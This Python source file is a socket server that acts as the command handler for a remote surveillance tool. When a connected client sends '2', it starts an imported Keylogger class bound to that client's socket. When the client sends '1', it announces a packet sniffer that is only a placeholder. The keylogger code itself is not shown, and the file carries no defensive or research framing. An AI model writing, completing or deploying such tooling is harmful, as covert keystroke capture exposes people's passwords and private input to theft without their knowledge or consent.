import socket
from Keylogger.server import Keylogger

# Server configuration local
HOST = 'localhost'
PORT = 12346

# Create a socket server
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Allow address reuse
server_socket.bind((HOST, PORT))
server_socket.listen(1)
print(f"Server is listening on {HOST}:{PORT}")

try:
    while True:
        # Accept a client connection
        client_socket, client_address = server_socket.accept()
        print(f"Accepted connection from {client_address}")

        try:
            while True:
                # Perform communication with the client
                data = client_socket.recv(1024)
                if not data:
                    break  # Exit the loop when the client disconnects

                data = data.decode('utf-8')

                if data == '1':
                    print("starting packet sniffer")
                    # do packet sniffer code here.

                if data == '2':
                    print("starting keylogger")
                    try:
                        keylogger = Keylogger(client_socket)
                        keylogger.start()
                        keylogger.join()
                        # Stop the keylogger thread after joining
                        keylogger.stop()
                    except (ConnectionResetError, BrokenPipeError):
                        print("Client disconnected.")
                        break

        except KeyboardInterrupt:
            print("Server is stopping")
        finally:
            if client_socket:
                try:
                    client_socket.close()
                    print(f"Client disconnected from {client_address}")
                except (ConnectionResetError, BrokenPipeError):
                    print("Client disconnected abruptly.")

except KeyboardInterrupt:
    print("Server is stopping finally")
finally:
    server_socket.close()